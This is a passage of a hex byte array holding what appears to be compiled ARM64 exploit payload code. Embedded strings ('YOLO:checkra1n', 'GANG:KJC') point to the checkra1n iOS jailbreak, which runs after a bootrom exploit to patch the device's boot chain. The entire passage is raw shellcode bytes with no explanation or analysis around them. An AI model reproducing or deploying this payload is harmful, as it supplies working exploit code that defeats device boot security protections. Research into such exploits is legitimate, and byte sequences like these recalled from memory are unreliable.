        0x01, 0x00, 0x00, 0x00, 0x0c, 0x05, 0x0a, 0x42, 0x01, 0x00, 0x00, 0x00,
        0x08, 0x18, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x05, 0x0a, 0x42, 0x01, 0x00, 0x00, 0x00, 0x6c, 0x04, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x80,
        0x01, 0x00, 0x00, 0x00, 0xe4, 0x03, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x60, 0x05, 0x0b, 0x80, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x44, 0xcc, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x34, 0x04, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0xa5, 0x00, 0x00,
        0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x10, 0x01, 0x67, 0x00, 0x10, 0x7e, 0x01, 0x00, 0x10,
        0x9f, 0x3f, 0x03, 0xd5, 0x20, 0x7b, 0x0b, 0xd5, 0x00, 0x00, 0x01, 0x91,
        0x1f, 0x00, 0x01, 0xeb, 0xa3, 0xff, 0xff, 0x54, 0x9f, 0x3f, 0x03, 0xd5,
        0xdf, 0x3f, 0x03, 0xd5, 0x1f, 0x75, 0x08, 0xd5, 0xdf, 0x3f, 0x03, 0xd5,
        0xc0, 0x03, 0x5f, 0xd6, 0x27, 0x00, 0xc0, 0xd2, 0x47, 0x41, 0xa8, 0xf2,
        0x07, 0x00, 0x98, 0xf2, 0x01, 0x80, 0xb2, 0x52, 0x01, 0x20, 0x80, 0x72,
        0xe1, 0x00, 0x00, 0xb9, 0xe1, 0x03, 0x84, 0x52, 0x61, 0xa0, 0xba, 0x72,
        0xe1, 0x70, 0x00, 0xb9, 0xe1, 0x80, 0x00, 0xb9, 0x00, 0xc0, 0xa7, 0xd2,
        0xe0, 0x00, 0x00, 0x8b, 0x00, 0x80, 0x0f, 0x91, 0x01, 0x20, 0x00, 0x91,
        0xe2, 0x07, 0x61, 0xb2, 0x42, 0x0c, 0x42, 0x91, 0x40, 0x64, 0x06, 0xf9,
        0x41, 0x74, 0x06, 0xf9, 0xe0, 0x80, 0x0f, 0x91, 0xc1, 0x01, 0x00, 0x10,
        0x02, 0x04, 0x80, 0xd2, 0x8b, 0x01, 0x00, 0x94, 0x61, 0x02, 0x00, 0x10,
        0x82, 0x81, 0x81, 0xd2, 0x88, 0x01, 0x00, 0x94, 0xe1, 0x03, 0x00, 0xaa,
        0xe0, 0x03, 0x07, 0xaa, 0xdb, 0xff, 0xff, 0x97, 0x28, 0x00, 0xc0, 0xd2,
        0x08, 0xc6, 0x80, 0xf2, 0x00, 0x00, 0x80, 0x52, 0x13, 0x00, 0x80, 0x52,
        0x00, 0x01, 0x1f, 0xd6, 0x20, 0x00, 0x80, 0x52, 0xc0, 0x03, 0x5f, 0xd6,
        0xe8, 0x07, 0x61, 0xb2, 0x08, 0x21, 0x42, 0x91, 0x00, 0xd5, 0x47, 0xb9,
        0x00, 0x78, 0x04, 0x12, 0x00, 0xd5, 0x07, 0xb9, 0xc0, 0x03, 0x5f, 0xd6,
        0xf9, 0x03, 0x00, 0xaa, 0xf8, 0x03, 0x01, 0xaa, 0xf7, 0x03, 0x1e, 0xaa,
        0xf6, 0x03, 0x1d, 0xaa, 0x2b, 0x02, 0x00, 0x94, 0x20, 0x03, 0x42, 0xb9,
        0x81, 0x89, 0x89, 0x52, 0x41, 0x08, 0xa4, 0x72, 0x1f, 0x00, 0x01, 0x6b,
        0xa0, 0x15, 0x00, 0x54, 0x21, 0xcd, 0x89, 0x52, 0xe1, 0xed, 0xad, 0x72,
        0x21, 0x03, 0x02, 0xb9, 0x20, 0x0b, 0x42, 0xb9, 0xe1, 0xac, 0x8c, 0x52,
        0x21, 0x06, 0xa4, 0x72, 0x1f, 0x00, 0x01, 0x6b, 0xa0, 0x14, 0x00, 0x54,
        0xe0, 0x03, 0x19, 0xaa, 0x69, 0x02, 0x00, 0x94, 0x85, 0x02, 0x00, 0x94,
        0xa7, 0x02, 0x00, 0x94, 0xe0, 0x03, 0x19, 0xaa, 0xe3, 0x2b, 0x18, 0x32,
        0x01, 0x42, 0x80, 0x52, 0x01, 0x52, 0xba, 0x72, 0xe2, 0x01, 0x80, 0x12,
        0x4f, 0x02, 0x00, 0x94, 0x40, 0x13, 0x00, 0xb4, 0x04, 0x4c, 0x40, 0xb8,
        0x82, 0x6c, 0x1c, 0x12, 0x01, 0x2e, 0x98, 0x52, 0x21, 0x54, 0xbe, 0x72,
        0x5f, 0x00, 0x01, 0x6b, 0xc1, 0xfe, 0xff, 0x54, 0x04, 0x04, 0x40, 0xb9,
        0x82, 0x6c, 0x1c, 0x12, 0x01, 0x0a, 0x80, 0x52, 0x01, 0x58, 0xbe, 0x72,
        0x5f, 0x00, 0x01, 0x6b, 0x01, 0xfe, 0xff, 0x54, 0x01, 0x28, 0xb7, 0x52,
        0x81, 0x10, 0x1b, 0x33, 0xe2, 0x03, 0x80, 0x12, 0x03, 0x08, 0x80, 0x52,
        0x3d, 0x02, 0x00, 0x94, 0xa0, 0x25, 0x00, 0xb4, 0x01, 0x80, 0xb2, 0x52,
        0x02, 0x80, 0xbf, 0x52, 0x03, 0x08, 0x80, 0x52, 0x41, 0x02, 0x00, 0x94,
        0x00, 0x25, 0x00, 0xb4, 0xe5, 0x03, 0x00, 0xaa, 0x81, 0x28, 0x00, 0x18,
        0x02, 0x00, 0x80, 0x12, 0x03, 0x00, 0x82, 0x52, 0x32, 0x02, 0x00, 0x94,
        0x40, 0x24, 0x00, 0xb4, 0x01, 0x80, 0xb2, 0x52, 0x02, 0x80, 0xbf, 0x52,
        0x03, 0x20, 0x80, 0x52, 0x36, 0x02, 0x00, 0x94, 0xa0, 0x23, 0x00, 0xb4,
        0x04, 0xc0, 0x5f, 0xb8, 0x84, 0x00, 0x02, 0x0a, 0x9f, 0x00, 0x01, 0x6b,
        0x20, 0x03, 0x00, 0x54, 0xe6, 0x03, 0x00, 0xaa, 0xa1, 0x00, 0x40, 0xb9,
        0x21, 0x64, 0x7e, 0x93, 0x20, 0x00, 0x05, 0x8b, 0x01, 0x08, 0xb5, 0x52,
        0xa1, 0x7f, 0x8f, 0x72, 0x02, 0xcc, 0xbf, 0x52, 0xe2, 0xff, 0x8f, 0x72,
        0x03, 0x20, 0x80, 0x52, 0x1e, 0x02, 0x00, 0x94, 0xc0, 0x21, 0x00, 0xb4,
        0x01, 0x80, 0xa2, 0x52, 0x02, 0x80, 0xbf, 0x52, 0x03, 0x04, 0x80, 0x52,
        0x19, 0x02, 0x00, 0x94, 0x20, 0x21, 0x00, 0xb4, 0x01, 0x00, 0x40, 0xb9,
        0x21, 0x64, 0x7e, 0x93, 0x20, 0x00, 0x00, 0x8b, 0x00, 0x00, 0x05, 0xcb,
        0x02, 0x80, 0xb2, 0x52, 0x02, 0x6c, 0x02, 0x33, 0xa2, 0x44, 0x00, 0xb8,
        0xc0, 0x10, 0x00, 0x91, 0x00, 0x00, 0x05, 0xcb, 0x02, 0x80, 0xa2, 0x52,
        0x02, 0x6c, 0x02, 0x33, 0xa2, 0x00, 0x00, 0xb9, 0xe0, 0x03, 0x19, 0xaa,
        0x01, 0x60, 0xa1, 0x52, 0x02, 0x80, 0x9f, 0x52, 0x02, 0xfc, 0xbf, 0x72,
        0xe3, 0x2b, 0x18, 0x32, 0x06, 0x02, 0x00, 0x94, 0xc0, 0x1e, 0x00, 0xb4,
        0x04, 0x4c, 0x40, 0xb8, 0x05, 0x82, 0x9f, 0x52, 0x05, 0xfc, 0xbf, 0x72,
        0x84, 0x00, 0x05, 0x0a, 0x06, 0x02, 0x89, 0x52, 0x06, 0x04, 0xb7, 0x72,
        0x9f, 0x00, 0x06, 0x6b, 0xe1, 0xfe, 0xff, 0x54, 0x04, 0x08, 0x40, 0xb9,
        0x45, 0x21, 0x00, 0x18, 0x9f, 0x00, 0x05, 0x6b, 0x61, 0xfe, 0xff, 0x54,
        0x61, 0xa0, 0xba, 0x52, 0xe1, 0x03, 0x84, 0x72, 0x01, 0x00, 0x00, 0xb9,
        0xe0, 0x03, 0x19, 0xaa, 0x81, 0x00, 0x80, 0x52, 0x01, 0x50, 0xa2, 0x72,
        0x02, 0x00, 0x80, 0x12, 0xe3, 0x2b, 0x18, 0x32, 0xf0, 0x01, 0x00, 0x94,
        0x00, 0x1c, 0x00, 0xb4, 0x04, 0x4c, 0x40, 0xb8, 0x25, 0x00, 0x80, 0x52,
        0x05, 0x80, 0xa2, 0x72, 0x9f, 0x00, 0x05, 0x6b, 0x41, 0xff, 0xff, 0x54,
        0x01, 0x0c, 0x80, 0x52, 0x41, 0x40, 0xae, 0x72, 0xe2, 0x03, 0x80, 0x12,
        0x03, 0x08, 0x80, 0x52, 0xe5, 0x01, 0x00, 0x94, 0xa0, 0x1a, 0x00, 0xb4,
        0x08, 0x44, 0x40, 0xb8, 0x08, 0x11, 0x00, 0x12, 0x01, 0x1e, 0x00, 0x18,
        0x02, 0x00, 0x80, 0x12, 0x03, 0x00, 0x82, 0x52, 0xde, 0x01, 0x00, 0x94,
        0xc0, 0x19, 0x00, 0xb4, 0x1f, 0x7d, 0x00, 0x71, 0xc0, 0x01, 0x00, 0x54,
        0x01, 0x00, 0x8f, 0x52, 0x01, 0x4c, 0xa1, 0x72, 0x01, 0x11, 0x10, 0x33,
        0xe2, 0x7f, 0x80, 0x12, 0x03, 0x08, 0x80, 0x52, 0xde, 0x01, 0x00, 0x94,
        0xa0, 0x18, 0x00, 0xb4, 0x04, 0x4c, 0x40, 0xb8, 0x84, 0x30, 0x0d, 0x12,
        0x05, 0xe0, 0xa6, 0x52, 0x9f, 0x00, 0x05, 0x6b, 0x01, 0x18, 0x00, 0x54,
        0x17, 0x00, 0x00, 0x14, 0x01, 0x40, 0x80, 0x52, 0x41, 0x40, 0xa2, 0x72,
        0x02, 0xc0, 0x9f, 0x52, 0xe2, 0xff, 0xb3, 0x72, 0x03, 0x08, 0x80, 0x52,
        0xd1, 0x01, 0x00, 0x94, 0x00, 0x17, 0x00, 0xb4, 0x04, 0x44, 0x40, 0xb8,
        0x84, 0x78, 0x1d, 0x53, 0x05, 0xc0, 0xa6, 0x52, 0x07, 0xff, 0xbf, 0x52,
        0x06, 0x80, 0xaa, 0x52, 0xe8, 0x33, 0x08, 0x32, 0x9f, 0x00, 0x00, 0x71,
        0xa1, 0x00, 0x86, 0x1a, 0xe2, 0x00, 0x88, 0x1a, 0x84, 0x18, 0x43, 0x7a,
        0xa1, 0x15, 0x00, 0x54, 0x03, 0x04, 0x80, 0x52, 0xba, 0x01, 0x00, 0x94,
        0x40, 0x15, 0x00, 0xb4, 0x01, 0x00, 0x00, 0x14, 0x61, 0xa0, 0xba, 0x52,
        0xe1, 0x03, 0x84, 0x72, 0x01, 0x00, 0x00, 0xb9, 0x20, 0x13, 0x00, 0x91,
        0x01, 0xc0, 0xa6, 0x52, 0x01, 0x01, 0x80, 0x72, 0xe2, 0x4b, 0x0e, 0x32,
        0xe3, 0x2b, 0x18, 0x32, 0x05, 0x3c, 0xc0, 0x92, 0x05, 0xf0, 0xbf, 0xf2,
        0x05, 0x02, 0x80, 0xf2, 0x06, 0x50, 0xbe, 0xd2, 0xc7, 0x40, 0x00, 0x91,
        0x06, 0x28, 0xf7, 0xf2, 0x06, 0x01, 0xc0, 0xf2, 0xe7, 0x0b, 0xf7, 0xf2,
        0x07, 0x41, 0xd8, 0xf2, 0x00, 0x10, 0x00, 0x91, 0xa5, 0x01, 0x00, 0x94,
        0xa0, 0x12, 0x00, 0xb4, 0x04, 0x80, 0x5f, 0xf8, 0x84, 0x00, 0x05, 0x8a,
        0x9f, 0x00, 0x06, 0xeb, 0x84, 0x10, 0x47, 0xfa, 0x21, 0xff, 0xff, 0x54,
        0x04, 0x21, 0x80, 0x52, 0x04, 0x40, 0xa6, 0x72, 0x04, 0x00, 0x00, 0xb9,
        0x00, 0x10, 0x00, 0xd1, 0x01, 0x00, 0x80, 0x52, 0x01, 0x80, 0xb2, 0x72,
        0x02, 0x00, 0x80, 0x52, 0x02, 0x80, 0xbf, 0x72, 0x03, 0x80, 0x00, 0xd1,
        0x04, 0xcc, 0x5f, 0xf8, 0x84, 0x00, 0x02, 0x8a, 0x9f, 0x00, 0x01, 0xeb,
        0x80, 0x00, 0x00, 0x54, 0x1f, 0x00, 0x03, 0xeb, 0x68, 0xff, 0xff, 0x54,
        0x80, 0x00, 0x00, 0x14, 0x62, 0xa0, 0xba, 0x52, 0xe2, 0x03, 0x84, 0x72,
        0x02, 0x08, 0x00, 0x29, 0xe0, 0x03, 0x19, 0xaa, 0xfa, 0x01, 0x00, 0x94,
        0xe1, 0x2b, 0x18, 0x32, 0x01, 0x00, 0x01, 0x8b, 0x62, 0xa0, 0xba, 0x52,
        0xe2, 0x03, 0x84, 0x72, 0x43, 0x80, 0x22, 0x11, 0x04, 0x80, 0xa2, 0x52,
        0x87, 0x3b, 0x80, 0xd2, 0x08, 0x00, 0x80, 0xd2, 0x1f, 0x00, 0x01, 0xeb,
        0x22, 0x0e, 0x00, 0x54, 0x05, 0x00, 0x40, 0xb9, 0xbf, 0x00, 0x00, 0x71,
        0xa4, 0x10, 0x42, 0x7a, 0xa4, 0x10, 0x43, 0x7a, 0xa4, 0x10, 0x44, 0x7a,
        0x60, 0x00, 0x00, 0x54, 0x00, 0x10, 0x00, 0x91, 0xf7, 0xff, 0xff, 0x17,
        0xe5, 0x03, 0x00, 0xaa, 0xa6, 0x4c, 0x40, 0xb8, 0xdf, 0x00, 0x00, 0x71,
        0xc4, 0x10, 0x42, 0x7a, 0xc4, 0x10, 0x43, 0x7a, 0xc4, 0x10, 0x44, 0x7a,
        0x60, 0x00, 0x00, 0x54, 0xe0, 0x03, 0x05, 0xaa, 0xee, 0xff, 0xff, 0x17,
        0xa6, 0x00, 0x00, 0xcb, 0xdf, 0x00, 0x07, 0x6b, 0x42, 0x00, 0x00, 0x54,
        0xf5, 0xff, 0xff, 0x17, 0xe9, 0x03, 0x00, 0xaa, 0xa8, 0x00, 0x00, 0xb5,
        0xe8, 0x03, 0x09, 0xaa, 0xe0, 0x03, 0x05, 0xaa, 0x87, 0x3c, 0x80, 0xd2,
        0xe4, 0xff, 0xff, 0x17, 0xe0, 0x03, 0x08, 0xaa, 0x61, 0x0e, 0x00, 0x10,
        0x82, 0x3b, 0x80, 0xd2, 0x6e, 0x00, 0x00, 0x94, 0xe0, 0x03, 0x09, 0xaa,
        0xc1, 0x1c, 0x00, 0x10, 0x82, 0x3c, 0x80, 0xd2, 0x6a, 0x00, 0x00, 0x94,
        0x27, 0xc3, 0x09, 0x91, 0xe8, 0x24, 0x00, 0xa9, 0x20, 0x83, 0x0a, 0x91,
        0xe8, 0x03, 0x00, 0xaa, 0x01, 0x0a, 0x00, 0x10, 0x02, 0x0c, 0x80, 0xd2,
        0x63, 0x00, 0x00, 0x94, 0xe0, 0x03, 0x19, 0xaa, 0x01, 0x50, 0xba, 0x52,
        0x41, 0x02, 0x80, 0x72, 0x02, 0x00, 0x80, 0x12, 0xe3, 0x2b, 0x18, 0x32,
        0x50, 0x01, 0x00, 0x94, 0x00, 0x08, 0x00, 0xb4, 0x01, 0xa3, 0xba, 0x52,
        0x01, 0x00, 0x82, 0x72, 0xe2, 0x03, 0x80, 0x12, 0x03, 0x40, 0x80, 0x52,
        0x53, 0x01, 0x00, 0x94, 0x40, 0x07, 0x00, 0xb4, 0xc1, 0x16, 0x00, 0x18,
        0x02, 0x00, 0x80, 0x12, 0x03, 0x04, 0x80, 0x52, 0x45, 0x01, 0x00, 0x94,
        0xa0, 0x06, 0x00, 0xb4, 0x24, 0x53, 0x09, 0x91, 0x05, 0x98, 0xc0, 0x29,
        0x85, 0x18, 0x81, 0x28, 0x05, 0x18, 0x41, 0x29, 0xc7, 0x7c, 0x18, 0x53,
        0xff, 0x60, 0x01, 0x71, 0x60, 0x00, 0x00, 0x54, 0x85, 0x18, 0x81, 0x28,
        0x13, 0x00, 0x00, 0x14, 0x85, 0x44, 0x00, 0xb8, 0xc7, 0x5c, 0x05, 0x13,
        0x07, 0xc8, 0x27, 0x8b, 0xe7, 0xc0, 0x40, 0xf8, 0xff, 0x3c, 0x50, 0xf2,
        0xc1, 0x04, 0x00, 0x54, 0xc6, 0x10, 0x00, 0x12, 0x06, 0x58, 0xba, 0x72,
        0xe5, 0xbc, 0x60, 0xd3, 0xa6, 0x3c, 0x1b, 0x33, 0x86, 0x44, 0x00, 0xb8,
        0x06, 0x54, 0xbe, 0x72, 0xe5, 0x7c, 0x50, 0xd3, 0xa6, 0x3c, 0x1b, 0x33,
        0x86, 0x44, 0x00, 0xb8, 0x06, 0x50, 0xbe, 0x72, 0xe6, 0x3c, 0x1b, 0x33,
        0x86, 0x44, 0x00, 0xb8, 0xe1, 0xcb, 0xba, 0x52, 0x01, 0x48, 0x80, 0x72,
        0x81, 0x00, 0x00, 0xb9, 0x01, 0x58, 0xba, 0x52, 0x41, 0x02, 0x80, 0x72,
        0x05, 0xbd, 0x60, 0xd3, 0xa1, 0x3c, 0x1b, 0x33, 0x01, 0x00, 0x00, 0xb9,
        0x01, 0x54, 0xbe, 0x72, 0x05, 0x7d, 0x50, 0xd3, 0xa1, 0x3c, 0x1b, 0x33,
        0x01, 0x04, 0x00, 0xb9, 0x01, 0x50, 0xbe, 0x72, 0x01, 0x3d, 0x1b, 0x33,
        0x01, 0x08, 0x00, 0xb9, 0xe1, 0xc7, 0xba, 0x52, 0x01, 0x48, 0x80, 0x72,
        0x01, 0x0c, 0x00, 0xb9, 0xe0, 0x03, 0x19, 0xaa, 0xe1, 0x03, 0x18, 0xaa,
        0xfe, 0x03, 0x17, 0xaa, 0xfd, 0x03, 0x16, 0xaa, 0x9f, 0x3f, 0x03, 0xd5,
        0xdf, 0x4f, 0x03, 0xd5, 0xc0, 0x03, 0x5f, 0xd6, 0x50, 0x00, 0xc0, 0xd2,
        0x70, 0x05, 0xa2, 0xf2, 0x10, 0x00, 0x98, 0xf2, 0x11, 0x02, 0x40, 0xb9,
        0xf1, 0x78, 0x1f, 0x12, 0x11, 0x02, 0x00, 0xb9, 0x00, 0x00, 0x00, 0x14,
        0xf2, 0x03, 0x1e, 0xaa, 0xc0, 0xcf, 0x74, 0x92, 0x00, 0x00, 0x2f, 0x91,
        0x81, 0x02, 0x00, 0x18, 0xc2, 0x4f, 0x40, 0xb8, 0x5f, 0x00, 0x01, 0x6b,
        0xc1, 0xff, 0xff, 0x54, 0x04, 0x00, 0x1e, 0xcb, 0x02, 0x80, 0xa2, 0x52,
        0x82, 0x6c, 0x02, 0x33, 0xc2, 0x03, 0x00, 0xb9, 0x21, 0xfd, 0xff, 0x58,
        0x82, 0x3b, 0x80, 0xd2, 0x08, 0x00, 0x00, 0x94, 0x01, 0xfd, 0xff, 0x58,
        0x82, 0x3c, 0x80, 0xd2, 0x05, 0x00, 0x00, 0x94, 0x9f, 0x3f, 0x03, 0xd5,
        0xdb, 0xff, 0xff, 0x17, 0x24, 0x44, 0x40, 0xb8, 0x04, 0x44, 0x00, 0xb8,
        0x42, 0x10, 0x00, 0x71, 0xa2, 0xff, 0xff, 0x54, 0xc0, 0x03, 0x5f, 0xd6,
        0xdf, 0x4f, 0x03, 0xd5, 0xfc, 0x03, 0x1e, 0xaa, 0xfb, 0x03, 0x00, 0xaa,
        0x48, 0x00, 0xc0, 0xd2, 0x68, 0x05, 0xa2, 0xf2, 0x08, 0x00, 0x80, 0xf2,
        0x1f, 0x0d, 0x00, 0xb9, 0x1f, 0x1d, 0x00, 0xb9, 0x08, 0x1a, 0x00, 0x58,
        0x00, 0x01, 0x3f, 0xd6, 0x48, 0x19, 0x00, 0x58, 0x08, 0xc0, 0x18, 0xd5,
        0x20, 0x02, 0x00, 0x10, 0x21, 0x00, 0xc0, 0xd2, 0x41, 0x01, 0xb0, 0xf2,
        0x01, 0x00, 0x98, 0xf2, 0x22, 0x10, 0x40, 0x91, 0x1f, 0x00, 0x01, 0xeb,
        0x02, 0x20, 0x42, 0xfa, 0x43, 0x01, 0x00, 0x54, 0x21, 0xd0, 0x01, 0x91,
        0x22, 0x30, 0x0d, 0x91, 0xe3, 0x03, 0x01, 0xaa, 0x04, 0x44, 0x40, 0xb8,
        0x24, 0x44, 0x00, 0xb8, 0x3f, 0x00, 0x02, 0xeb, 0xa3, 0xff, 0xff, 0x54,
        0x7c, 0x00, 0x00, 0x94, 0x60, 0x00, 0x1f, 0xd6, 0x60, 0x15, 0x00, 0x58,
        0x81, 0x15, 0x00, 0x58, 0x02, 0x88, 0x81, 0x52, 0x7c, 0x00, 0x00, 0x94,
        0x02, 0x3a, 0x91, 0x52, 0x7f, 0x00, 0x00, 0x94, 0x20, 0x15, 0x00, 0x58,
        0xbf, 0x41, 0x00, 0xd5, 0x1f, 0x00, 0x00, 0x91, 0x00, 0x04, 0x40, 0x91,
        0xbf, 0x40, 0x00, 0xd5, 0x1f, 0x00, 0x00, 0x91, 0x00, 0x08, 0x40, 0x91,
        0x88, 0x14, 0x00, 0x58, 0x00, 0x01, 0x00, 0xf9, 0xff, 0x44, 0x03, 0xd5,
        0x1f, 0x75, 0x08, 0xd5, 0x49, 0x14, 0x00, 0x58, 0x07, 0x0c, 0xe0, 0xd2,
        0x27, 0x84, 0x80, 0xf2, 0xe1, 0x03, 0x09, 0xaa, 0x02, 0x00, 0x90, 0x52,
        0x6e, 0x00, 0x00, 0x94, 0xe8, 0x03, 0x09, 0xaa, 0x20, 0x00, 0xc0, 0xd2,
        0x41, 0x00, 0xa0, 0x52, 0xa0, 0xd0, 0x80, 0xf2, 0x71, 0x00, 0x00, 0x94,
        0x40, 0x00, 0xc0, 0xd2, 0x01, 0x00, 0xa4, 0x52, 0x00, 0x00, 0x07, 0xaa,
        0x6d, 0x00, 0x00, 0x94, 0xc0, 0x00, 0xc0, 0xd2, 0x01, 0x00, 0xa4, 0x52,
        0x00, 0x00, 0x07, 0xaa, 0x69, 0x00, 0x00, 0x94, 0xe0, 0x00, 0xc0, 0xd2,
        0x00, 0x00, 0xb8, 0xf2, 0x01, 0x40, 0xa0, 0x52, 0x00, 0x00, 0x07, 0xaa,
        0x64, 0x00, 0x00, 0x94, 0x28, 0x11, 0x40, 0x91, 0x00, 0x05, 0x40, 0xb2,
        0x20, 0x01, 0x03, 0xf9, 0xe0, 0x07, 0x61, 0xb2, 0x01, 0x04, 0xa0, 0x52,
        0xe0, 0xc0, 0x80, 0xf2, 0x59, 0x00, 0x00, 0x94, 0x9f, 0x3f, 0x03, 0xd5,
        0x80, 0xe0, 0x9f, 0x52, 0x00, 0xa2, 0x18, 0xd5, 0x09, 0x20, 0x18, 0xd5,
        0x20, 0x00, 0xc0, 0xd2, 0x80, 0xb3, 0xac, 0xf2, 0x80, 0xa3, 0x94, 0xf2,
        0x40, 0x20, 0x18, 0xd5, 0x1f, 0x87, 0x08, 0xd5, 0xdf, 0x3f, 0x03, 0xd5,
        0x40, 0x10, 0x38, 0xd5, 0x00, 0x04, 0x0c, 0x32, 0x40, 0x10, 0x18, 0xd5,
        0xa8, 0x01, 0x82, 0x52, 0x00, 0x10, 0x38, 0xd5, 0x00, 0x00, 0x08, 0xaa,
        0x00, 0x10, 0x18, 0xd5, 0xdf, 0x3f, 0x03, 0xd5, 0x68, 0x0f, 0x00, 0x58,
        0xc0, 0x0e, 0x00, 0x58, 0xa1, 0x00, 0xa0, 0x52, 0x01, 0x00, 0x80, 0x72,
        0x22, 0x00, 0x80, 0x52, 0x00, 0x01, 0x3f, 0xd6, 0xf3, 0x0e, 0x00, 0x10,
        0x14, 0x10, 0x00, 0x10, 0x68, 0x86, 0x40, 0xf8, 0x00, 0x00, 0x80, 0x52,
        0x00, 0x01, 0x3f, 0xd6, 0x7f, 0x02, 0x14, 0xeb, 0x83, 0xff, 0xff, 0x54,
        0x88, 0x0f, 0x00, 0x58, 0x20, 0x00, 0x80, 0x52, 0x00, 0x01, 0x3f, 0xd6,
        0xc0, 0x09, 0x00, 0x10, 0x41, 0x0f, 0x00, 0x58, 0xe2, 0x01, 0x80, 0xd2,
        0x03, 0x14, 0x40, 0x38, 0x23, 0x14, 0x00, 0x38, 0x42, 0x04, 0x00, 0x51,
        0xa2, 0xff, 0xff, 0x35, 0x40, 0x09, 0x00, 0x70, 0xa1, 0x0e, 0x00, 0x58,
        0xa2, 0x03, 0x80, 0xd2, 0x03, 0x14, 0x40, 0x38, 0x23, 0x14, 0x00, 0x38,
        0x42, 0x04, 0x00, 0x51, 0xa2, 0xff, 0xff, 0x35, 0x40, 0x00, 0x80, 0x52,
        0x01, 0x0e, 0x00, 0x58, 0x20, 0x00, 0x00, 0xb9, 0xc8, 0x0c, 0x00, 0x58,
        0x20, 0x0a, 0x00, 0x58, 0x01, 0x02, 0xa0, 0xd2, 0x00, 0x01, 0x3f, 0xd6,
        0x31, 0x00, 0x00, 0x94, 0x9f, 0x3f, 0x03, 0xd5, 0x80, 0x09, 0x00, 0x58,
        0x01, 0x00, 0x44, 0x91, 0x20, 0x7b, 0x0b, 0xd5, 0x00, 0x00, 0x01, 0x91,
        0x1f, 0x00, 0x01, 0xeb, 0xa3, 0xff, 0xff, 0x54, 0x0b, 0x00, 0x00, 0x94,
        0xdf, 0x4f, 0x03, 0xd5, 0xbf, 0x41, 0x00, 0xd5, 0xff, 0x03, 0x40, 0x92,
        0x1f, 0x41, 0x18, 0xd5, 0x1f, 0xc0, 0x18, 0xd5, 0xdf, 0x3f, 0x03, 0xd5,
        0xfe, 0x03, 0x1c, 0xaa, 0xe0, 0x03, 0x1b, 0xaa, 0xa8, 0x07, 0x00, 0x58,
        0x00, 0x01, 0x1f, 0xd6, 0x9f, 0x3f, 0x03, 0xd5, 0xdf, 0x3f, 0x03, 0xd5,
        0x1f, 0x75, 0x08, 0xd5, 0xdf, 0x3f, 0x03, 0xd5, 0xc0, 0x03, 0x5f, 0xd6,
        0x03, 0x10, 0xc1, 0xa8, 0x23, 0x10, 0x81, 0xa8, 0x42, 0x40, 0x00, 0x71,
        0xa8, 0xff, 0xff, 0x54, 0xc0, 0x03, 0x5f, 0xd6, 0x3f, 0x7c, 0x81, 0xa8,
        0x42, 0x40, 0x00, 0x71, 0xc8, 0xff, 0xff, 0x54, 0xc0, 0x03, 0x5f, 0xd6,
        0x04, 0xfc, 0x4b, 0xd3, 0x21, 0xfc, 0x4e, 0xd3, 0x03, 0x00, 0x88, 0x52,
        0x04, 0x00, 0x00, 0x14, 0x04, 0xfc, 0x56, 0xd3, 0x21, 0xfc, 0x59, 0xd3,
        0x03, 0x40, 0xa0, 0x52, 0x84, 0x28, 0x7d, 0x92, 0x84, 0x00, 0x08, 0x8b,
        0x02, 0x00, 0x80, 0x52, 0x80, 0x58, 0x22, 0xf8, 0x00, 0x00, 0x03, 0x8b,
        0x42, 0x04, 0x00, 0x11, 0x5f, 0x00, 0x01, 0x6b, 0x83, 0xff, 0xff, 0x54,
        0xc0, 0x03, 0x5f, 0xd6, 0x41, 0x00, 0xc0, 0xd2, 0x01, 0xe2, 0xa1, 0xf2,
        0x01, 0x67, 0x80, 0xf2, 0x20, 0x00, 0x40, 0xb9, 0x00, 0x74, 0x1e, 0x12,
        0x20, 0x00, 0x00, 0xb9, 0xc0, 0x03, 0x5f, 0xd6, 0x1f, 0x20, 0x03, 0xd5,
        0x59, 0x4f, 0x4c, 0x4f, 0x3a, 0x63, 0x68, 0x65, 0x63, 0x6b, 0x72, 0x61,
        0x31, 0x6e, 0x00, 0x47, 0x41, 0x4e, 0x47, 0x3a, 0x4b, 0x4a, 0x43, 0x20,
